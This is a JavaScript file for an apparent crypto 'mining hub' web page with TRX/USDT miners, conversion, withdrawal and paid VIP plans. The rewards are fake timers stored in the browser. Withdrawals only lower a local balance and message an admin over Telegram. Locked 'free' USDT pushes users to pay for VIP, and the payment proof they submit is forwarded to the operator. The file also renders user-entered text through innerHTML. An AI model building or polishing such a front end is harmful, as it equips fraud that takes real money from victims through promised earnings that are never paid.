/* script.js — Modern mining hub (persistent localStorage) */

/* ---------------- CONFIG ---------------- */
const TELEGRAM_BOT_TOKEN = "REPLACE_WITH_YOUR_BOT_TOKEN"; // don't store real token in public client
const ADMIN_CHAT_ID = "REPLACE_WITH_YOUR_CHAT_ID";

const TRX_PRICE_USDT = 0.0006; // per your request
const NEW_ACCOUNT_TRX = 20;

/* miners definition */
const MINERS = [
  { id:'m1', title:'Standard Miner', durationMs: 2 * 60 * 60 * 1000, reward: 5, rewardType:'trx', class:'miner-standard' },
  { id:'m2', title:'Golden Miner', durationMs: 15 * 24 * 60 * 60 * 1000, reward: 1200, rewardType:'trx', class:'miner-gold' },
  { id:'m3', title:'Red Miner', durationMs: 10 * 24 * 60 * 60 * 1000, reward: 10, rewardType:'usdt', class:'miner-red' },
  { id:'m4', title:'Free 6 USDT Claim', durationMs: 24 * 60 * 60 * 1000, reward: 6, rewardType:'usdt', class:'miner-free' }
];

/* ---------------- state helpers ---------------- */
function getState(k,d){ try{ const v = localStorage.getItem(k); return v?JSON.parse(v):d } catch(e){ return d } }
function setState(k,v){ localStorage.setItem(k, JSON.stringify(v)) }

let state = getState('trxgv_state_v1', {
  trx: NEW_ACCOUNT_TRX,
  usdt: +(NEW_ACCOUNT_TRX * TRX_PRICE_USDT).toFixed(6),
  teamCount:0,
  miners:{},
  vipPlan: null,
  vipSince: null,
  lockedUsdt: 0,
  refId: null
});

/* ensure miners state */
MINERS.forEach(m => {
  if(!state.miners[m.id]) state.miners[m.id] = { miningActive:false, miningEnd:null, history:[] };
});

/* ---------------- DOM refs ---------------- */
const minersGrid = document.getElementById('minersGrid');
const trxAmountEl = document.getElementById('trxAmount');
const meVipBalanceEl = document.getElementById('vipBalance');
const lockedUSDTEl = document.getElementById('lockedUSDT');

const convertInput = document.getElementById('convertInput');
const convertDo = document.getElementById('convertDo');
const convertResult = document.getElementById('convertResult');

const withdrawMethod = document.getElementById('withdrawMethod');
const withdrawUID = document.getElementById('withdrawUID');
const withdrawAmount = document.getElementById('withdrawAmount');
const submitWithdraw = document.getElementById('submitWithdraw');
const vipFastBtn = document.getElementById('vipFastBtn');
const withdrawMsg = document.getElementById('withdrawMsg');

const buyVipBtns = document.querySelectorAll('.buy-vip');
const vipSubmit = document.getElementById('vipSubmit');
const vipExchange = document.getElementById('vipExchange');
const vipSenderUID = document.getElementById('vipSenderUID');
const vipMemo = document.getElementById('vipMemo');
const vipFile = document.getElementById('vipFile');
const vipMsg = document.getElementById('vipMsg');

const toastEl = document.getElementById('toast');

/* ---------------- Helpers ---------------- */
function toast(msg, time=2500){
  toastEl.innerText = msg;
  toastEl.classList.remove('hidden');
  setTimeout(()=> toastEl.classList.add('hidden'), time);
}

function formatMs(ms){
  const s = Math.floor(ms/1000);
  if(s<=0) return '0s';
  const d = Math.floor(s / 86400);
  const h = Math.floor((s % 86400) / 3600);
  const m = Math.floor((s % 3600) / 60);
  const sec = s % 60;
  return `${d}d ${h}h ${m}m ${sec}s`;
}

/* ---------------- Render ---------------- */
let intervals = {};

function renderAll(){
  trxAmountEl.innerText = parseFloat(state.trx).toFixed(6);
  meVipBalanceEl.innerText = state.vipPlan ? (parseFloat(state.usdt + state.lockedUsdt).toFixed(6) + ' USDT') : 'N/A';
  lockedUSDTEl.innerText = parseFloat(state.lockedUsdt).toFixed(6);
  if(!state.refId){ state.refId = Math.random().toString(36).slice(2,9).toUpperCase(); setState('trxgv_state_v1', state); }

  minersGrid.innerHTML = '';
  MINERS.forEach(miner => {
    const s = state.miners[miner.id];
    const card = document.createElement('div');
    card.className = 'miner-card ' + miner.class;
    card.innerHTML = `
      <div class="miner-head">
        <div class="miner-title">${miner.title}</div>
        <div class="miner-meta">${(miner.reward)} ${miner.rewardType.toUpperCase()}</div>
      </div>
      <div class="miner-body">
        <div class="circle"><div class="pill">${miner.rewardType.toUpperCase()}</div></div>
        <div style="flex:1">
          <div class="progress"><i id="bar-${miner.id}"></i></div>
          <div id="timer-${miner.id}" class="muted small" style="margin-top:6px">Not started</div>
          <div style="margin-top:8px">
            <button class="btn primary start-btn" data-id="${miner.id}">${s.miningActive?'Mining...':'Start'}</button>
            <button class="btn" style="margin-left:8px" data-id="${miner.id}" id="collect-${miner.id}">Collect</button>
            <button class="btn" style="margin-left:8px" data-id="${miner.id}" id="info-${miner.id}">Info</button>
          </div>
          <div id="msg-${miner.id}" class="muted small" style="margin-top:8px"></div>
        </div>
      </div>
      <div id="hist-${miner.id}" class="small muted" style="margin-top:8px"></div>
    `;
    minersGrid.appendChild(card);

    card.querySelector('.start-btn').addEventListener('click', ()=> startMiner(miner.id));
    card.querySelector(`#collect-${miner.id}`).addEventListener('click', ()=> collectMiner(miner.id));
    card.querySelector(`#info-${miner.id}`).addEventListener('click', ()=> alert(`${miner.title}\nCycle: ${formatMs(miner.durationMs)}\nReward: ${miner.reward} ${miner.rewardType.toUpperCase()}`));
  });

  updateMinersUI();
  setState('trxgv_state_v1', state);
}

function updateMinersUI(){
  MINERS.forEach(miner=>{
    const s = state.miners[miner.id];
    const bar = document.getElementById(`bar-${miner.id}`);
    const timer = document.getElementById(`timer-${miner.id}`);
    const hist = document.getElementById(`hist-${miner.id}`);
    const msg = document.getElementById(`msg-${miner.id}`);
    if(Array.isArray(s.history) && s.history.length){
      hist.innerHTML = s.history.slice().reverse().map(h => `${new Date(h.time).toLocaleString()}: ${h.text}`).join('<br>');
    } else hist.innerText = 'No history';

    if(s.miningActive && s.miningEnd){
      const rem = s.miningEnd - Date.now();
      if(rem <= 0){
        bar.style.width = '100%';
        timer.innerText = 'Ready to claim';
        msg.innerText = 'Ready to collect';
      } else {
        const pct = Math.max(0, Math.min(100, ((miner.durationMs - rem)/miner.durationMs)*100));
        bar.style.width = pct + '%';
        timer.innerText = formatMs(rem);
        msg.innerText = '';
      }
    } else {
      bar.style.width = '0%';
      timer.innerText = 'Not started';
      msg.innerText = '';
    }
  });
}

/* ---------------- Mining actions ---------------- */
function startMiner(id){
  const minerDef = MINERS.find(m=>m.id===id);
  const mstate = state.miners[id];
  if(mstate.miningActive){ toast('Already mining'); return; }
  mstate.miningActive = true;
  mstate.miningEnd = Date.now() + minerDef.durationMs;
  mstate.history.push({ text: 'Started', time: Date.now() });
  setState('trxgv_state_v1', state);
  sendTelegram(`Start Miner • ${minerDef.title} • Ref:${state.refId}`);
  renderAll();
}

function collectMiner(id){
  const minerDef = MINERS.find(m=>m.id===id);
  const mstate = state.miners[id];
  if(!mstate.miningActive || !mstate.miningEnd){ alert('Nothing to collect'); return; }
  if(Date.now() < mstate.miningEnd){ alert('Not finished'); return; }

  if(minerDef.rewardType === 'trx'){
    state.trx = parseFloat((state.trx + minerDef.reward).toFixed(6));
    state.usdt = parseFloat((state.trx * TRX_PRICE_USDT).toFixed(6));
  } else {
    // USDT reward
    if(minerDef.id === 'm4' && !state.vipPlan){
      // non-VIP: locked
      state.lockedUsdt = parseFloat((state.lockedUsdt + minerDef.reward).toFixed(6));
    } else {
      state.usdt = parseFloat((state.usdt + minerDef.reward).toFixed(6));
    }
  }

  mstate.miningActive = false;
  mstate.miningEnd = null;
  mstate.history.push({ text: `Collected ${minerDef.reward} ${minerDef.rewardType.toUpperCase()}`, time: Date.now() });
  setState('trxgv_state_v1', state);
  sendTelegram(`Collected • ${minerDef.title} • Reward:${minerDef.reward}${minerDef.rewardType}`);
  renderAll();
}

/* ---------------- Convert ---------------- */
convertDo?.addEventListener('click', ()=>{
  const v = parseFloat(convertInput.value || 0);
  if(!v || v <= 0){ alert('Enter TRX'); return; }
  if(v > state.trx){ alert('Not enough TRX'); return; }
  const converted = v * TRX_PRICE_USDT;
  state.trx = parseFloat((state.trx - v).toFixed(6));
  state.usdt = parseFloat((state.usdt + converted).toFixed(6));
  setState('trxgv_state_v1', state);
  convertResult.innerText = `Converted ${v} TRX → ${converted.toFixed(6)} USDT`;
  sendTelegram(`Convert TRX→USDT • TRX:${v} • USDT:${converted.toFixed(6)} • Ref:${state.refId}`);
  renderAll();
});

/* ---------------- Withdraw (regular) ---------------- */
submitWithdraw?.addEventListener('click', ()=>{
  const uid = withdrawUID.value.trim();
  const amt = parseFloat(withdrawAmount.value || 0);
  if(!uid){ alert('Enter UID'); return; }
  if(isNaN(amt) || amt <= 0){ alert('Enter valid amount'); return; }
  if(amt > state.usdt){ alert('Insufficient USDT'); return; }
  if(amt < 0.01){ alert('Minimum 0.01 USDT'); return; }
  state.usdt = parseFloat((state.usdt - amt).toFixed(6));
  state.miners['m1'].history.push({ text: `Withdraw ${amt} USDT -> ${uid}`, time: Date.now() });
  setState('trxgv_state_v1', state);
  withdrawMsg.innerText = `Withdraw submitted: ${amt.toFixed(6)} USDT to ${uid}`;
  sendTelegram(`Withdraw Request • UID:${uid} • Amount:${amt.toFixed(6)} USDT • Ref:${state.refId}`);
  renderAll();
});

/* ---------------- VIP Fast Withdraw ---------------- */
vipFastBtn?.addEventListener('click', ()=>{
  if(!state.vipPlan){ alert('VIP only'); return; }
  const amt = parseFloat(prompt('Enter VIP fast withdraw amount (USDT)') || 0);
  if(isNaN(amt) || amt <= 0){ alert('Invalid amount'); return; }
  const total = parseFloat((state.usdt + state.lockedUsdt).toFixed(6));
  if(amt > total){ alert('Insufficient VIP balance'); return; }
  // consume locked first
  let need = amt;
  if(state.lockedUsdt > 0){
    const fromLocked = Math.min(state.lockedUsdt, need);
    state.lockedUsdt = parseFloat((state.lockedUsdt - fromLocked).toFixed(6));
    need -= fromLocked;
  }
  if(need > 0) state.usdt = parseFloat((state.usdt - need).toFixed(6));
  setState('trxgv_state_v1', state);
  toast('VIP fast withdraw processed');
  sendTelegram(`VIP Fast Withdraw • Amount:${amt} USDT • Ref:${state.refId}`);
  renderAll();
});

/* ---------------- VIP Buy & Proof ---------------- */
buyVipBtns.forEach(b => b.addEventListener('click', (e)=>{
  const plan = e.currentTarget.dataset.plan;
  const info = plan === 'vip1' ? { fee:1, daily:0.5 } : { fee:10, daily:6 };
  if(state.usdt < info.fee){ alert('Not enough USDT'); return; }
  if(!confirm(`Buy ${plan.toUpperCase()} for ${info.fee} USDT?`)) return;
  state.usdt = parseFloat((state.usdt - info.fee).toFixed(6));
  state.vipPlan = plan;
  state.vipSince = Date.now();
  setState('trxgv_state_v1', state);
  toast(`VIP ${plan.toUpperCase()} purchased`);
  sendTelegram(`VIP Purchase • ${plan} • Fee:${info.fee} USDT • Ref:${state.refId}`);
  renderAll();
}));

vipSubmit?.addEventListener('click', ()=>{
  const exch = vipExchange.value;
  const sender = vipSenderUID.value.trim();
  const memo = vipMemo.value.trim();
  if(!sender || !memo){ alert('Enter UID & memo'); return; }
  const arr = getState('vip_reqs_v1', []);
  arr.push({ ref: state.refId, exch, sender, memo, time: Date.now() });
  setState('vip_reqs_v1', arr);
  vipMsg.innerText = 'VIP proof submitted for review';
  sendTelegram(`VIP Proof Submitted • exch:${exch} • sender:${sender} • memo:${memo} • Ref:${state.refId}`);
});

/* ---------------- Telegram (client-side best-effort) ---------------- */
async function sendTelegram(text){
  if(!TELEGRAM_BOT_TOKEN || !ADMIN_CHAT_ID || TELEGRAM_BOT_TOKEN.includes('REPLACE')) {
    console.log('TG disabled or placeholder token — message:', text);
    return;
  }
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  try {
    await fetch(url, {
      method:'POST',
      headers:{ 'Content-Type':'application/json' },
      body: JSON.stringify({ chat_id: ADMIN_CHAT_ID, text })
    });
    console.log('tg ok');
  } catch(e){
    console.error('tg err', e);
    const q = getState('tg_fail_v1', []);
    q.push({ text, time: Date.now() });
    setState('tg_fail_v1', q);
  }
}

/* ---------------- startup ---------------- */
(function init(){
  // ensure numbers
  state.trx = parseFloat(state.trx);
  state.usdt = parseFloat(state.usdt || 0);
  // resume intervals
  renderAll();
  // re-run interval updates
  setInterval(()=> updateMinersUI(), 1000);
  // show VIP fast withdraw control if VIP
  if(state.vipPlan) document.getElementById('vipFastBtn').style.display = 'inline-block';
})();
